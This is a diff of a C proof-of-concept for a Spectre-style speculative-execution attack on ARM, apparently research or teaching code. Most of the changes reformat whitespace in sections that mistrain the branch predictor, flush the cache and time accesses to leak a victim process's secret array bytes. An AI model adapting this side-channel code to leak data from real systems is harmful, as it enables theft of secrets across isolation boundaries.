@@ -14,13 +14,13 @@
 #include <string.h>
 
 #define OOB_READ 16			// Number of byte read
-#define ARRAY_SIZE 46		// Array1 size
+#define ARRAY_SIZE 46			// Array1 size
 #define FAKE_SIZE 13
 #define MISTRAIN 10			// Parameter for mistraining
-#define SAME_BIT_CYCLES 10	// Number of reading tries on the same byte
+#define SAME_BIT_CYCLES 10		// Number of reading tries on the same byte
 #define CACHE_LINES 128
-#define N_OF_BITS 8 //number of bits in a byte
-#define LATENCY_THRESHOLD	100
+#define N_OF_BITS 8 			//number of bits in a byte
+#define LATENCY_THRESHOLD 100
 #define ARRAY2_SIZE 256*64
 #define SPACE_FOR_PARAMS 50
 #define SB 0
@@ -98,7 +98,7 @@ int main(void){
 
 	int pid=fork();
 	if(pid==0){
-    //victim
+    		//victim
 		char placeholder='A';
 		char buf;
 		// set up array1 with the public and secret contents (not visible to the father thanks to the copy on write policy)
@@ -194,32 +194,31 @@ int main(void){
             read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
 
 
-					memcpy(&ptr[ARRAY2_SIZE],&x,sizeof(int)); // to copy the value of k in the shared memory
-					memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+		memcpy(&ptr[ARRAY2_SIZE],&x,sizeof(int)); // to copy the value of k in the shared memory
+		memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
 
-					// Flush the shared memory
-					for(k=0;k<ARRAY2_SIZE+SPACE_FOR_PARAMS;k++) // Flushing array2
-						Flush(&ptr[k]);
+		// Flush the shared memory
+		for(k=0;k<ARRAY2_SIZE+SPACE_FOR_PARAMS;k++) // Flushing array2
+			Flush(&ptr[k]);
 
-					//Flush everything else
-					for(k=0;k<ARRAY_SIZE;k++)
-						Flush(&array1[k]); // we still flush it for safety, probably there is no need because it contains dummy data for the father that are never accessed
+		//Flush everything else
+		for(k=0;k<ARRAY_SIZE;k++)
+			Flush(&array1[k]); // we still flush it for safety, probably there is no need because it contains dummy data for the father that are never accessed
 
-					for(k=0;k<OOB_READ;k++)
-						for(l=0;l<N_OF_BITS;l++){
-							Flush(&timings[k][l][0]);
-							Flush(&timings[k][l][1]);
-						}
+		for(k=0;k<OOB_READ;k++)
+			for(l=0;l<N_OF_BITS;l++){
+				Flush(&timings[k][l][0]);
+				Flush(&timings[k][l][1]);
+			}
 
-					// array1_size must be known by the father because it needs to issue requests for the mistraining
-					Flush(&array1_size);
-					//callFakeBranches();  // Mistraining branch predictor (setting BHR to 0000000000)
+		// array1_size must be known by the father because it needs to issue requests for the mistraining
+		Flush(&array1_size);
 					
-//					asm volatile(	"nop				\t\n");
-					asm volatile(	"nop				\t\n");
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8			 	\t\n"
-									"nop				\t\n"
+//		asm volatile(	"nop				\t\n");
+		asm volatile(	"nop				\t\n");
+		asm volatile(	"cmn sp,#0			\t\n"
+				"beq 8			 	\t\n"
+				"nop				\t\n"
 															 );
 
 					asm volatile(	"cmn sp,#0			\t\n"
